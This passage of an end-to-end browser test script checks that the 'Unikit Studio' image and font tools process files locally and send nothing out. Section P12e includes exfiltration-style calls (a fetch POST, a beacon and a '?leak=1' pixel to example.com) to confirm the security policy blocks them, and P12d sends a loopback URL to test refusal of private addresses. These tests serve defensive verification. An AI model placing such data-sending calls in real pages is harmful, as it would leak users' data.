  await clickButton(tab, "Size limits");
  await tab.waitForSelector("#maxWidth");
  await setInput(tab, "#maxWidth", 200);
  await selectFiles(tab, [fixturePath("photo-800x600.jpg"), fixturePath("alpha-160x100.avif")]);
  await optimize(tab);
  table = await results(tab);
  const shrunk = table.find((entry) => entry.name === "photo-800x600.jpg");
  const untouched = table.find((entry) => entry.name === "alpha-160x100.avif");
  const shrunkFile = await saveRow(tab, shrunk.output);
  const shrunkHeader = readImageHeader(new Uint8Array(shrunkFile.bytes));
  check("an 800 × 600 image with max width 200 becomes 200 × 150: proportions kept", shrunk.dimensions === "200 × 150" && shrunkHeader.width === 200 && shrunkHeader.height === 150, shrunk.dimensions);
  check("a 160 × 100 image is not enlarged to reach the limit", untouched.dimensions === "160 × 100", untouched.dimensions);
  await setInput(tab, "#maxWidth", 600);
  await setInput(tab, "#maxHeight", 300);
  await optimize(tab);
  table = await results(tab);
  check("with both limits, the tighter one decides: 800 × 600 inside 600 × 300 is 400 × 300", table.find((entry) => entry.name === "photo-800x600.jpg").dimensions === "400 × 300", JSON.stringify(table.map((entry) => entry.dimensions)));
  await setInput(tab, "#maxWidth", "");
  await setInput(tab, "#maxHeight", "");

  /* ======================================================================= */
  section("P12a · A ZIP of the results is built in the tab");
  const zipMark = proxy.mark();
  const archive = await download(() => clickButton(tab, "Download all (ZIP)"));
  const zip = await JSZip.loadAsync(archive.bytes);
  const entries = Object.keys(zip.files).sort();
  check("the ZIP is saved from a blob: URL under the product's name", archive.url.startsWith("blob:") && archive.filename === "unikit-images.zip", archive.filename);
  check("it holds one entry per result", entries.length === 2 && entries.includes("photo-800x600-optimized.webp") && entries.includes("alpha-160x100-optimized.webp"), entries.join(", "));
  const zipped = Buffer.from(await zip.file("photo-800x600-optimized.webp").async("uint8array"));
  const single = await saveRow(tab, "photo-800x600-optimized.webp");
  check("an entry is byte for byte the file a single download gives", sha256(zipped) === sha256(single.bytes));
  const zipTraffic = onlyStaticGets(proxy.since(zipMark));
  check("building it sent nothing: at most the ZIP library was fetched from this origin", zipTraffic.ok && proxy.since(zipMark).every((entry) => entry.bodyBytes === 0), zipTraffic.detail);

  /* ======================================================================= */
  section("P10 · A batch can be cancelled, runs with bounded concurrency, and recovers");
  await startOver(tab);
  // A 12-megapixel JPEG, made by the browser's own encoder, so that AVIF encoding takes long enough to interrupt.
  const bigBase64 = await tab.evaluate(async () => {
    const canvas = new OffscreenCanvas(4000, 3000);
    const context = canvas.getContext("2d");
    const gradient = context.createLinearGradient(0, 0, 4000, 3000);
    gradient.addColorStop(0, "#1d4ed8");
    gradient.addColorStop(0.5, "#f59e0b");
    gradient.addColorStop(1, "#10b981");
    context.fillStyle = gradient;
    context.fillRect(0, 0, 4000, 3000);
    const strip = context.getImageData(0, 0, 4000, 300);
    for (let index = 0; index < strip.data.length; index += 4) {
      const noise = (Math.random() - 0.5) * 60;
      strip.data[index] += noise;
      strip.data[index + 1] += noise;
      strip.data[index + 2] += noise;
    }
    for (let y = 0; y < 3000; y += 300) context.putImageData(strip, 0, y);
    const blob = await canvas.convertToBlob({ type: "image/jpeg", quality: 0.9 });
    const bytes = new Uint8Array(await blob.arrayBuffer());
    let binary = "";
    for (let index = 0; index < bytes.length; index += 0x8000) binary += String.fromCharCode(...bytes.subarray(index, index + 0x8000));
    return btoa(binary);
  });
  const big = Buffer.from(bigBase64, "base64");
  const bigPaths = Array.from({ length: 8 }, (_, index) => input(`large-${index + 1}.jpg`, big));
  await choose(tab, "Output format", "AVIF");
  await selectFiles(tab, bigPaths);
  await waitChecked(tab);
  rows = await queue(tab);
  check(`eight ${formatBytes(big.length)} photos of 4,000 × 3,000 px are queued`, rows.length === 8 && rows.every((entry) => entry.status === "ready" && entry.text.includes("4,000 × 3,000")), rows[0]?.text);
  // Watch how many files are in work at the same moment.
  await tab.evaluate(() => {
    window.__peak = 0;
    const list = document.querySelector('[data-testid="queue"]');
    const measure = () => {
      window.__peak = Math.max(window.__peak, list.querySelectorAll('li[data-status="processing"]').length);
    };
    window.__observer = new MutationObserver(measure);
    window.__observer.observe(list, { attributes: true, subtree: true, attributeFilter: ["data-status"] });
  });
  const beforeCancel = await probe(tab);
  await clickButton(tab, "Optimize ");
  await tab.waitForFunction(() => document.querySelectorAll('[data-testid="queue"] li[data-status="done"]').length >= 1, { timeout: 120_000 });
  const responsive = await tab.evaluate(() => new Promise((resolve) => {
    const started = performance.now();
    requestAnimationFrame(() => requestAnimationFrame(() => resolve(performance.now() - started)));
  }));
  check(`the page stays responsive while images are encoded (two frames in ${Math.round(responsive)} ms)`, responsive < 1_000);
  const cancelClicked = Date.now();
  await clickButton(tab, "Cancel", { exact: true });
  await waitIdle(tab, 10_000);
  const cancelMs = Date.now() - cancelClicked;
  rows = await queue(tab);
  const peak = await tab.evaluate(() => {
    window.__observer.disconnect();
    return window.__peak;
  });
  const afterCancel = await probe(tab);
  const count = (status) => rows.filter((entry) => entry.status === status).length;
  check(`cancelling stopped the batch in ${cancelMs} ms`, cancelMs < 5_000 && count("processing") === 0 && count("waiting") === 0, JSON.stringify(rows.map((entry) => entry.status)));
  check(`files that had finished keep their results (${count("done")}); the rest are marked cancelled (${count("cancelled")})`, count("done") >= 1 && count("cancelled") >= 1 && count("done") + count("cancelled") === 8);
  check("the workers that were running were terminated, which is what frees their memory", afterCancel.workersTerminated > beforeCancel.workersTerminated, `${beforeCancel.workersTerminated} → ${afterCancel.workersTerminated}`);
  check(`never more than ${limits.concurrency} file${limits.concurrency === 1 ? "" : "s"} in work at once on this device (peak ${peak})`, peak >= 1 && peak <= limits.concurrency, `peak ${peak}`);
  check("the results of the finished files can still be downloaded", (await results(tab)).length === count("done"));
  // The same queue can be run again: the engine starts new workers.
  await setInput(tab, "#maxWidth", 400);
  await optimize(tab);
  rows = await queue(tab);
  table = await results(tab);
  check("after a cancel, the whole queue runs again to completion", rows.every((entry) => entry.status === "done") && table.length === 8 && table.every((entry) => entry.dimensions === "400 × 300"), JSON.stringify(rows.map((entry) => entry.status)));
  await setInput(tab, "#maxWidth", "");
  await clickButton(tab, "Hide size limits");

  /* ======================================================================= */
  section("P11 · Nothing is left behind");
  const beforeClear = await probe(tab);
  check("previews are shown through blob: URLs while results are on screen", beforeClear.live > 0, `${beforeClear.live} live`);
  check("previews are limited to a few at a time, however many results there are", await tab.evaluate(() => document.querySelectorAll('[data-testid="review"] article').length) === 6);
  await startOver(tab);
  await sleep(100);
  const afterClear = await probe(tab);
  check("clearing the results releases every blob: URL", afterClear.live === 0, `${afterClear.live} still live of ${afterClear.created} created`);
  // Leave the page with results on screen: the same must hold.
  await selectFiles(tab, [fixturePath("lossy-400x300.webp")]);
  await choose(tab, "Output format", "WebP");
  await optimize(tab);
  check("a result is on screen again, with live previews", (await probe(tab)).live > 0);
  await tab.click('a[href="/app/fonts"]');
  await tab.waitForFunction(() => document.body.innerText.includes("Stylesheet input"));
  await sleep(150);
  const afterLeave = await probe(tab);
  check("leaving the page releases every blob: URL", afterLeave.live === 0, `${afterLeave.live} still live`);
  check("leaving the page terminates every worker it started", afterLeave.workersTerminated === afterLeave.workersCreated && tab.workers().length === 0, `${afterLeave.workersTerminated} of ${afterLeave.workersCreated} terminated, ${tab.workers().length} alive`);
  const stored = await tab.evaluate(async () => ({
    cookie: document.cookie,
    local: Object.keys(localStorage),
    session: Object.keys(sessionStorage),
    databases: indexedDB.databases ? (await indexedDB.databases()).map((database) => database.name) : [],
    caches: "caches" in window ? await caches.keys() : [],
    serviceWorkers: "serviceWorker" in navigator ? (await navigator.serviceWorker.getRegistrations()).length : 0,
  }));
  check("the site set no cookie", stored.cookie === "" && proxy.log.every((entry) => !entry.setCookie && !entry.cookieSent));
  check("nothing was written to localStorage, sessionStorage, IndexedDB or the Cache API by processing images", stored.local.length === 0 && stored.session.length === 0 && stored.databases.length === 0 && stored.caches.length === 0, JSON.stringify(stored));
  check("no service worker is registered", stored.serviceWorkers === 0);

  /* ======================================================================= */
  section("P12b · Font Optimizer: the stylesheet is parsed and patched in the tab");
  const cssMark = proxy.mark();
  const secret = `secret-font-${randomBytes(6).toString("hex")}`;
  const css = `@font-face {\n  font-family: "${secret}";\n  src: url("/fonts/a.woff2") format("woff2");\n}\n@font-face {\n  font-family: "Kept";\n  src: url("/fonts/b.woff2");\n  font-display: optional;\n}\n.title { font-family: "${secret}", sans-serif; }\n`;
  await setInput(tab, "#css-editor", css);
  await clickButton(tab, "Analyze", { exact: true });
  await tab.waitForFunction(() => document.body.innerText.includes("is missing font-display"));
  check("the analysis finds the rule without font-display", await tab.evaluate((name) => document.body.innerText.includes(`@font-face for “${name}” is missing font-display`), secret));
  await clickButton(tab, "Apply font-display");
  await tab.waitForFunction(() => document.body.innerText.includes("Before and after"));
  const patched = await download(() => clickButton(tab, "Download CSS"));
  const patchedText = patched.bytes.toString("utf8");
  check("the downloaded stylesheet has font-display: swap in the rule that lacked it", /src: url\("\/fonts\/a\.woff2"\) format\("woff2"\);\n\s*font-display: swap/.test(patchedText), patchedText);
  check("the rule that already had a value keeps it, and the other rules are unchanged", patchedText.includes("font-display: optional;") && patchedText.includes(`.title { font-family: "${secret}", sans-serif; }`) && (patchedText.match(/font-display/g) ?? []).length === 2);
  check("analysing and patching caused no request", proxy.since(cssMark).length === 0, proxy.since(cssMark).map((entry) => `${entry.method} ${entry.path}`).join(", "));
  check("the stylesheet's contents appear in nothing the browser sent", !sent(proxy.log).includes(secret));
  check("the draft is kept in sessionStorage only, so it is gone when the tab closes", await tab.evaluate(() => Object.keys(sessionStorage).join() === "unikit:css-draft" && Object.keys(localStorage).length === 0));

  section("P12c · Asset Analyzer: files are read in the tab");
  await tab.click('a[href="/app/assets"]');
  await tab.waitForFunction(() => document.body.innerText.includes("Inspect files"));
  const assetMark = proxy.mark();
  const stylesheet = input("site.css", Buffer.from(css));
  await selectFiles(tab, [fixturePath("rotated-gps-240x160.jpg"), canaryPath, stylesheet, input("animation.png", animatedPng(4)), refusedPaths[0]]);
  await tab.waitForSelector('[data-testid="asset-results"]');
  const findings = await tab.evaluate(() => [...document.querySelectorAll('[data-testid="asset-results"] article')].map((card) => ({ name: card.querySelector("h3")?.getAttribute("title"), facts: card.querySelector("p.font-mono")?.innerText ?? "", codes: [...card.querySelectorAll("[data-finding]")].map((item) => item.getAttribute("data-finding")) })));
  const finding = (name) => findings.find((entry) => entry.name === name) ?? { codes: [], facts: "" };
  check("a photo with a GPS block is flagged, and its displayed size is read from the header", finding("rotated-gps-240x160.jpg").codes.includes("location-data") && finding("rotated-gps-240x160.jpg").facts.includes("160 × 240"), JSON.stringify(finding("rotated-gps-240x160.jpg")));
  check("the stylesheet's missing font-display is found", finding("site.css").codes.includes("font-display-missing"), JSON.stringify(finding("site.css")));
  check("an animated PNG is reported as animated", finding("animation.png").codes.includes("animated"));
  check("a text file with an image's name is reported as not recognised", finding("text-named.jpg").codes.includes("unrecognised"));
  check("analysing five files caused no request", proxy.since(assetMark).length === 0, proxy.since(assetMark).map((entry) => `${entry.method} ${entry.path}`).join(", "));
  check('the summary states what was sent to a server: "0 B"', await tab.evaluate(() => document.querySelector('[data-testid="asset-results"]').innerText.replace(/\s+/g, " ").toLowerCase().includes("sent to a server 0 b")));
  // Hand a file to the Image Optimizer: it travels in memory.
  const handMark = proxy.mark();
  await clickLabel(tab, `Optimize ${canaryName}`);
  await tab.waitForFunction(() => document.body.innerText.includes("1 · Select images"));
  await waitChecked(tab);
  rows = await queue(tab);
  check("the file arrives in the Image Optimizer's queue without being selected again", rows.length === 1 && rows[0].name === canaryName && rows[0].status === "ready", JSON.stringify(rows));
  check("the hand-over caused no request", proxy.since(handMark).length === 0);

  section("P12d · Website Audit: the one request with a body carries a URL and nothing else");
  await tab.click('a[href="/app/audit"]');
  await tab.waitForSelector("#audit-url");
  const auditMark = proxy.mark();
  await setInput(tab, "#audit-url", "http://127.0.0.1:9/private");
  await clickButton(tab, "Run audit");
  await tab.waitForFunction(() => document.body.innerText.includes("Audit not completed"), { timeout: 30_000 });
  const auditTraffic = proxy.since(auditMark);
  const auditRequest = auditTraffic[0];
  check("the audit made exactly one request: POST /api/v1/audits", auditTraffic.length === 1 && auditRequest.method === "POST" && auditRequest.path === "/api/v1/audits", auditTraffic.map((entry) => `${entry.method} ${entry.path}`).join(", "));
  check("its body is the URL and the page count as JSON, and nothing else", auditRequest.body.toString("utf8") === '{"url":"http://127.0.0.1:9/private","extraPages":0}' && auditRequest.contentType === "application/json", auditRequest.body.toString("utf8"));
  check("the server refuses a private address, and the page says why", auditRequest.status === 400 && (await tab.evaluate(() => /private|loopback|not allowed|public/i.test(document.body.innerText))), String(auditRequest.status));
  const bodies = proxy.log.filter((entry) => entry.bodyBytes > 0 || entry.declaredLength > 0);
  check("in the whole session, that was the only request that carried a body", bodies.length === 1 && bodies[0] === auditRequest, bodies.map((entry) => `${entry.method} ${entry.path} ${entry.bodyBytes}`).join(", "));

  section("P12e · The browser itself refuses to send anything to another origin");
  const blocked = await tab.evaluate(async () => {
    const attempts = {};
    try {
      await fetch("https://example.com/collect", { method: "POST", body: "x" });
      attempts.fetch = "sent";
    } catch (error) {
      attempts.fetch = String(error);
    }
    attempts.beacon = navigator.sendBeacon("https://example.com/beacon", "x");
    const image = new Image();
    attempts.image = await new Promise((resolve) => {
      image.onload = () => resolve("loaded");
      image.onerror = () => resolve("blocked");
      image.src = "https://example.com/pixel.gif?leak=1";
    });
    return attempts;
  });
  await sleep(300);
  const outside = proxy.log.filter((entry) => entry.refused === "other-origin" || entry.method === "CONNECT");
  check("fetch to another origin is blocked by the Content-Security-Policy", /Failed to fetch|violates|Refused/i.test(blocked.fetch), blocked.fetch);
  check("an image request to another origin is blocked too", blocked.image === "blocked", blocked.image);
  check("none of those attempts reached the network: the proxy saw no request to any other host in the whole session", outside.length === 0, outside.map((entry) => `${entry.method} ${entry.url}`).join(", "));
  check("every request of the whole session went to the app's own origin", proxy.log.every((entry) => entry.host === new URL(api.base).host), [...new Set(proxy.log.map((entry) => entry.host))].join(", "));

  section("P12f · The new name is everywhere and the old one is nowhere");
  const texts = {};
  for (const path of ["/", "/app", "/app/images", "/app/fonts", "/app/assets", "/app/audit", "/app/settings", "/app/history", "/app/usage"]) {
    await tab.goto(`${api.base}${path}`, { waitUntil: "networkidle0" });
    texts[path] = await tab.evaluate(() => `${document.title}\n${document.body.innerText}\n${document.documentElement.outerHTML}`);
  }
  check("no page shows or contains the old name", Object.values(texts).every((text) => !/optiweb/i.test(text)), Object.entries(texts).filter(([, text]) => /optiweb/i.test(text)).map(([path]) => path).join(", "));
  check("every page carries the new name", Object.values(texts).every((text) => /Unikit Studio/.test(text)));
  check("no page talks about uploads limits, storage quotas or retention", Object.values(texts).every((text) => !/Honest limitations|Enforced limits|storage quota|retention period|MB per file|files per batch/i.test(text.split("<")[0])), Object.entries(texts).filter(([, text]) => /Honest limitations|Enforced limits|storage quota|retention period|MB per file|files per batch/i.test(text.split("<")[0])).map(([path]) => path).join(", "));
  check("the landing page explains the privacy-first workflow", /Private because of how it is built/.test(texts["/"]) && /No endpoint accepts a file/.test(texts["/"]) && /You can check this yourself/.test(texts["/"]));
  check("the pages of the earlier version explain that nothing is stored any more", /Nothing is stored any more/.test(texts["/app/history"]) && /Nothing is stored any more/.test(texts["/app/usage"]));
  const head = await tab.evaluate(() => ({
    manifest: document.querySelector('link[rel="manifest"]')?.getAttribute("href"),
    icon: document.querySelector('link[rel="icon"][type="image/svg+xml"]')?.getAttribute("href"),
    touch: document.querySelector('link[rel="apple-touch-icon"]')?.getAttribute("href"),
    ogTitle: document.querySelector('meta[property="og:title"]')?.content,
    ogImage: document.querySelector('meta[property="og:image"]')?.content,
    twitter: document.querySelector('meta[name="twitter:card"]')?.content,
    description: document.querySelector('meta[name="description"]')?.content,
  }));
  check("the document head names the product in its title, description and social tags", /Unikit Studio/.test(head.ogTitle ?? "") && /Unikit Studio/.test(head.description ?? "") && head.twitter === "summary_large_image" && Boolean(head.ogImage), JSON.stringify(head));
  const manifest = await api.call(head.manifest ?? "/missing");
  const manifestJson = JSON.parse(manifest.text || "{}");
  check("the web app manifest is served and names the product", manifest.status === 200 && manifestJson.name === "Unikit Studio" && manifestJson.short_name === "Unikit" && manifestJson.icons?.length >= 3, manifest.text.slice(0, 120));
  for (const asset of [head.icon, head.touch, "/og-image.png", ...(manifestJson.icons ?? []).map((icon) => icon.src)]) {
    const response = await api.call(asset ?? "/missing");
    const kind = asset?.endsWith(".svg") ? response.text.includes("<svg") : readImageHeader(new Uint8Array(response.bytes))?.format === "png";
    check(`${asset} is served and is a real ${asset?.endsWith(".svg") ? "SVG" : "PNG"}`, response.status === 200 && kind, String(response.status));
  }

  section("P12g · Settings are kept in this browser only");
  await tab.goto(`${api.base}/app/settings`, { waitUntil: "networkidle0" });
  const settingsMark = proxy.mark();
  await tab.select("#pref-format", "avif");
  await tab.select("#pref-strategy", "no-regression");
  await setInput(tab, "#pref-width", 1600);
  await clickButton(tab, "Save settings");
  await tab.waitForFunction(() => localStorage.getItem("unikit:preferences") !== null);
  const savedSettings = await tab.evaluate(() => JSON.parse(localStorage.getItem("unikit:preferences")));
  check("saving writes the settings to localStorage", savedSettings.defaultImageFormat === "avif" && savedSettings.defaultStrategy === "no-regression" && savedSettings.defaultMaxWidth === 1600, JSON.stringify(savedSettings));
  check("saving sends nothing to the server", proxy.since(settingsMark).length === 0, proxy.since(settingsMark).map((entry) => `${entry.method} ${entry.path}`).join(", "));
  await tab.click('a[href="/app/images"]');
  await tab.waitForFunction(() => document.body.innerText.includes("1 · Select images"));
  const applied = await tab.evaluate(() => ({ strategy: document.querySelector('[aria-label="Optimization strategy"] [aria-checked="true"]')?.textContent.trim(), width: document.querySelector("#maxWidth")?.value }));
  check("the Image Optimizer starts from the saved settings", applied.strategy === "No-regression" && applied.width === "1600", JSON.stringify(applied));
  await tab.evaluate(() => localStorage.clear());

  /* ======================================================================= */
  section("P12h · The dropzone works with the keyboard and with drag and drop");
  await tab.goto(`${api.base}/app/images`, { waitUntil: "networkidle0" });
  const zone = await tab.$('[role="button"][aria-disabled]');
  await zone.focus();
  const [chooser] = await Promise.all([tab.waitForFileChooser({ timeout: 10_000 }), tab.keyboard.press("Enter")]);
  await chooser.accept([fixturePath("lossy-400x300.webp")]);
  await waitChecked(tab);
  check("Enter on the focused dropzone opens the file chooser, and the chosen file is queued", (await queue(tab)).some((entry) => entry.name === "lossy-400x300.webp" && entry.status === "ready"));
  await tab.evaluate((base64) => {
    const binary = atob(base64);
    const data = new Uint8Array(binary.length);
    for (let index = 0; index < binary.length; index += 1) data[index] = binary.charCodeAt(index);
    const transfer = new DataTransfer();
    transfer.items.add(new File([data], "dropped.png", { type: "application/octet-stream" }));
    document.querySelector('[role="button"][aria-disabled]').parentElement.dispatchEvent(new DragEvent("drop", { dataTransfer: transfer, bubbles: true, cancelable: true }));
  }, fixture("alpha-320x200.png").toString("base64"));
  await waitChecked(tab);
  rows = await queue(tab);
  check("a dropped file is queued and identified by its contents, whatever type the browser reported", rows.some((entry) => entry.name === "dropped.png" && entry.status === "ready" && entry.text.includes("PNG")), JSON.stringify(rows));
  await selectFiles(tab, [fixturePath("lossy-400x300.webp")]);
  await sleep(200);
  check("selecting a file that is already queued does not add it twice", (await queue(tab)).filter((entry) => entry.name === "lossy-400x300.webp").length === 1 && (await tab.evaluate(() => document.body.innerText.includes("already in the queue"))));
  await tab.close();

  /* ======================================================================= */
  section("P12i · A browser without canvases in workers processes on the page instead");
  for (const [label, before] of [
    ["without OffscreenCanvas", () => { delete window.OffscreenCanvas; }],
    ["when a worker cannot be started", () => { window.Worker = class { constructor() { throw new Error("workers are disabled"); } }; }],
  ]) {
    const fallback = await openPage("/app/images", { before });
    await choose(fallback, "Optimization strategy", "Best-effort");
    await selectFiles(fallback, [fixturePath("photo-800x600.jpg"), fixturePath("rotated-gps-240x160.jpg")]);
    await optimize(fallback);
    const fallbackTable = await results(fallback);
    const fallbackProbe = await probe(fallback);
    check(`${label}: both images are processed, with the same strategies`, fallbackTable.length === 2 && fallbackTable.every((entry) => entry.kind === "smaller" || entry.kind === "larger"), JSON.stringify(fallbackTable.map((entry) => [entry.name, entry.format, entry.kind])));
    check(`${label}: the rotation is still applied`, fallbackTable.find((entry) => entry.name === "rotated-gps-240x160.jpg")?.dimensions === "160 × 240");
    check(`${label}: no worker was used`, fallbackProbe.workersCreated === 0 && fallback.workers().length === 0, JSON.stringify(fallbackProbe));
    const saved = await saveRow(fallback, fallbackTable[0].output);
    check(`${label}: the result is a real file`, ["webp", "avif", "jpeg"].includes(readImageHeader(new Uint8Array(saved.bytes))?.format ?? ""));
    await fallback.close();
  }

  section("P12j · A browser whose canvas cannot write WebP uses the encoder served by this site");
  {
    // Safari's canvas answers a request for WebP with a PNG. Chromium is made to do the same here, on the
    // page path, so that the WebAssembly WebP encoder is the only way to a WebP file.
    const noWebp = await openPage("/app/images", {
      before: () => {
        delete window.OffscreenCanvas;
        const nativeToBlob = HTMLCanvasElement.prototype.toBlob;
        HTMLCanvasElement.prototype.toBlob = function toBlob(callback, type, quality) {
          return nativeToBlob.call(this, callback, type === "image/webp" ? "image/png" : type, quality);
        };
      },
    });
    const codecMark = proxy.mark();
    await choose(noWebp, "Output format", "WebP");
    await selectFiles(noWebp, [fixturePath("photo-800x600.jpg"), fixturePath("alpha-320x200.png")]);
    await optimize(noWebp);
    const webpTable = await results(noWebp);
    const photoRow = webpTable.find((entry) => entry.name === "photo-800x600.jpg");
    const alphaRow = webpTable.find((entry) => entry.name === "alpha-320x200.png");
    check("both images are converted", webpTable.length === 2 && Boolean(photoRow) && Boolean(alphaRow) && webpTable.every((entry) => entry.kind === "smaller" || entry.kind === "larger"), JSON.stringify(webpTable.map((entry) => [entry.name, entry.kind, entry.output])));
    const photoFile = photoRow ? await saveRow(noWebp, photoRow.output) : null;
    const alphaFile = alphaRow ? await saveRow(noWebp, alphaRow.output) : null;
    const photoHeader = photoFile ? readImageHeader(new Uint8Array(photoFile.bytes)) : null;
    const alphaHeader = alphaFile ? readImageHeader(new Uint8Array(alphaFile.bytes)) : null;
    check("the photo's output is a real WebP of 800 × 600 px", photoHeader?.format === "webp" && photoHeader.width === 800 && photoHeader.height === 600, JSON.stringify(photoHeader));
    check("the transparent image's output is a real WebP of 320 × 200 px that still has transparency", alphaHeader?.format === "webp" && alphaHeader.width === 320 && alphaHeader.height === 200 && alphaHeader.hasAlpha === true, JSON.stringify(alphaHeader));
    const codecTraffic = proxy.since(codecMark);
    // Decoded in a tab that has every browser feature.
    const plain = await openPage("/app/images");
    const decoded = photoFile ? await decodeInPage(plain, photoFile.bytes) : null;
    await plain.close();
    check("the browser's own decoder reads it back at the same size", decoded?.width === 800 && decoded?.height === 600, JSON.stringify(decoded));
    const codecFiles = codecTraffic.filter((entry) => /\/assets\/webp_enc[\w-]*\.wasm$/.test(entry.path));
    check("the WebP encoder is one .wasm file from this origin, requested without a body", codecFiles.length === 1 && onlyStaticGets(codecTraffic).ok, `${codecFiles.map((entry) => entry.path).join(", ")} ${onlyStaticGets(codecTraffic).detail}`);
    check(`the result is ${photoFile ? formatBytes(photoFile.bytes.length) : "?"} for a ${formatBytes(fixture("photo-800x600.jpg").length)} photo, and the size on screen is the file's size`, Boolean(photoFile) && photoRow.after === formatBytes(photoFile.bytes.length), `${photoRow?.after}`);
    await noWebp.close();
  }

  section("The whole session");
  check("no script error on any page", consoleErrors.filter((line) => !/example\.com|Content Security Policy|Failed to load resource/.test(line)).length === 0, consoleErrors.join(" | ").slice(0, 600));
  const totalSent = proxy.log.reduce((sum, entry) => sum + entry.bodyBytes, 0);
  const uploads = proxy.log.filter((entry) => /multipart|octet-stream|image\//i.test(entry.contentType ?? ""));
  check(`request bodies in the whole session: ${totalSent} bytes, all of them the audit's JSON`, totalSent === auditRequest.body.length && totalSent < 100);
  check("no request declared a file-like content type", uploads.length === 0, uploads.map((entry) => entry.contentType).join(", "));
  console.log(`\n  ${proxy.log.length} requests recorded, ${proxy.log.filter((entry) => entry.method === "GET").length} of them GET; ${totalSent} bytes of request body in total.`);
} catch (error) {
  checker.crashed(error);
  process.exitCode = 1;
} finally {
  await browser?.close().catch(() => undefined);
  await proxy?.close().catch(() => undefined);
  await api?.close().catch(() => undefined);
  rmSync(work, { recursive: true, force: true });
}

if (process.exitCode !== 1) process.exitCode = checker.report() ? 0 : 1;
